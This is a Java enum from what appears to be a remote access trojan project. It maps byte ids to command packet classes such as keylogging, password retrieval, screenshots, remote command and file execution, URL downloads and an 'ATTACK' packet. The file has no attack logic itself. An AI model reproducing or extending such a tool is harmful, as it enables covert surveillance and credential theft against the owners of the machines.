/*******************************************************************************
 * Copyright 2016 Johannes Boczek
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 *******************************************************************************/

package de.sogomn.rat.packet;

/*
 * SHOW ME A BETTER WAY TO DO THIS
 */
public enum PacketType {
	
	POPUP(1, PopupPacket.class),
	SCREENSHOT(2, ScreenshotPacket.class),
	KEY_EVENT(3, KeyEventPacket.class),
	FREE(4, FreePacket.class),
	INFORMATION(5, InformationPacket.class),
	COMMAND(6, CommandPacket.class),
	DESKTOP(7, DesktopPacket.class),
	CLIPBOARD(8, ClipboardPacket.class),
	FILE(9, FileRequestPacket.class),
	DOWNLOAD(10, DownloadFilePacket.class),
	UPLOAD(11, UploadFilePacket.class),
	EXECUTE(12, ExecuteFilePacket.class),
	DIRECTORY(13, NewDirectoryPacket.class),
	DELETE(14, DeleteFilePacket.class),
	MOUSE_EVENT(15, MouseEventPacket.class),
	VOICE(16, VoicePacket.class),
	WEBSITE(17, WebsitePacket.class),
	AUDIO(18, AudioPacket.class),
	PING(19, PingPacket.class),
	DOWNLOAD_URL(20, DownloadUrlPacket.class),
	CHAT(21, ChatPacket.class),
	FILE_INFORMATION(22, FileInformationPacket.class),
	ATTACK(23, AttackPacket.class),
	COMPUTER_INFORMATION(24, ComputerInfoPacket.class),
	UNINSTALL(25, UninstallPacket.class),
	KEYLOG(26, KeylogPacket.class),
	SHUTDOWN(27, ShutdownPacket.class),
	RESTART(28, RestartPacket.class),
	ROOTS(29, RootRequestPacket.class),
	PASSWORDS(30, PasswordPacket.class);
	
	public final byte id;
	public final Class<? extends IPacket> clazz;
	
	PacketType(final byte id, final Class<? extends IPacket> clazz) {
		this.id = id;
		this.clazz = clazz;
	}
	
	PacketType(final int id, final Class<? extends IPacket> clazz) {
		this((byte)id, clazz);
	}
	
	public static Class<? extends IPacket> getClass(final byte id) {
		final PacketType[] values = values();
		
		for (final PacketType type : values) {
			if (type.id == id) {
				return type.clazz;
			}
		}
		
		return null;
	}
	
	public static byte getId(final Class<? extends IPacket> clazz) {
		final PacketType[] values = values();
		
		for (final PacketType type : values) {
			if (type.clazz == clazz) {
				return type.id;
			}
		}
		
		return 0;
	}
	
	public static byte getId(final IPacket packet) {
		final Class<? extends IPacket> clazz = packet.getClass();
		
		return getId(clazz);
	}
	
}
